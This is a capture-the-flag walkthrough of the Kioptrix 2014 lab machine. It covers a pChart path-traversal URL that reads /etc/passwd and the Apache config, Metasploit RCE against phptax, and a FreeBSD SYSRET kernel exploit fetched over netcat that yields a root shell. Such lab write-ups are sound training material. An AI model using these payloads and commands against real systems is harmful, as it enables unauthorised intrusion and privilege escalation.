# Kioptrix: 2014 (#5)

## Recon & Enummeration

Nmap shows us two interesting webservices
```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-02-24 16:38 EST
Nmap scan report for 10.10.10.9
Host is up (0.00056s latency).
Not shown: 997 filtered ports
PORT     STATE  SERVICE VERSION
22/tcp   closed ssh
80/tcp   open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-title: Site doesn't have a title (text/html).
8080/tcp open   http    Apache httpd 2.2.21 ((FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8)
|_http-server-header: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8
|_http-title: 403 Forbidden
```
### Port 80

gobuster:
```
$ gobuster dir -u 10.10.10.9 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 2 -x php

```

Gobuster didn't result in many results, as the query rate was rather low. Therefore I stopped it without yielding any results.

## Intitial Foothold


The index page of the port 80 webserver contains a link in the source code to pchart 2.1.3 which is known for an LFI at `/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd`. Resulting in:

```
 # $FreeBSD: release/9.0.0/etc/master.passwd 218047 2011-01-28 22:29:38Z pjd $
#
root:*:0:0:Charlie &:/root:/bin/csh
toor:*:0:0:Bourne-again Superuser:/root:
daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/nologin
operator:*:2:5:System &:/:/usr/sbin/nologin
bin:*:3:7:Binaries Commands and Source:/:/usr/sbin/nologin
tty:*:4:65533:Tty Sandbox:/:/usr/sbin/nologin
kmem:*:5:65533:KMem Sandbox:/:/usr/sbin/nologin
games:*:7:13:Games pseudo-user:/usr/games:/usr/sbin/nologin
news:*:8:8:News Subsystem:/:/usr/sbin/nologin
man:*:9:9:Mister Man Pages:/usr/share/man:/usr/sbin/nologin
sshd:*:22:22:Secure Shell Daemon:/var/empty:/usr/sbin/nologin
smmsp:*:25:25:Sendmail Submission User:/var/spool/clientmqueue:/usr/sbin/nologin
mailnull:*:26:26:Sendmail Default User:/var/spool/mqueue:/usr/sbin/nologin
bind:*:53:53:Bind Sandbox:/:/usr/sbin/nologin
proxy:*:62:62:Packet Filter pseudo-user:/nonexistent:/usr/sbin/nologin
_pflogd:*:64:64:pflogd privsep user:/var/empty:/usr/sbin/nologin
_dhcp:*:65:65:dhcp programs:/var/empty:/usr/sbin/nologin
uucp:*:66:66:UUCP pseudo-user:/var/spool/uucppublic:/usr/local/libexec/uucp/uucico
pop:*:68:6:Post Office Owner:/nonexistent:/usr/sbin/nologin
www:*:80:80:World Wide Web Owner:/nonexistent:/usr/sbin/nologin
hast:*:845:845:HAST unprivileged user:/var/empty:/usr/sbin/nologin
nobody:*:65534:65534:Unprivileged user:/nonexistent:/usr/sbin/nologin
mysql:*:88:88:MySQL Daemon:/var/db/mysql:/usr/sbin/nologin
ossec:*:1001:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecm:*:1002:1001:User &:/usr/local/ossec-hids:/sbin/nologin
ossecr:*:1003:1001:User &:/usr/local/ossec-hids:/sbin/nologin
```

Now we know we have both `root` and `toor` users, as common with BSD, without any noticible user account

We can display the server configuration file as follows:
`/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf`


We can see we need the `Mozilla/4.0` user agent to access port 8080.
On this page we can see a folder "phptax" which gives us the phptax application. This application seems to be vulnerable to RCE.

We obtain RCE as uswer www by using metasploit exploit `multi/http/phptax_exec`. 

## Privilege Escalation

As user www we can see we're running FreeBSD 9.0, which is vulnerable to the Intel SYSRET kernel privesc. We grab the exploit on our host machine and pipe it to a netcat listener:
```
cat /usr/share/exploitdb/exploits/freebsd/local/28718.c | nc -lvp 1234
```

On our victim machine we do the opposite, compile and run:
```
nc 10.10.10.4 1234 > exploit.c
gcc -o exploit exploit.c
exploit.c:178:2: warning: no newline at end of file
./exploit
[+] SYSRET FUCKUP!!
[+] Start Engine...
[+] Crotz...
[+] Crotz...
[+] Crotz...
[+] Woohoo!!!
id
uid=0(root) gid=0(wheel) groups=0(wheel)
```


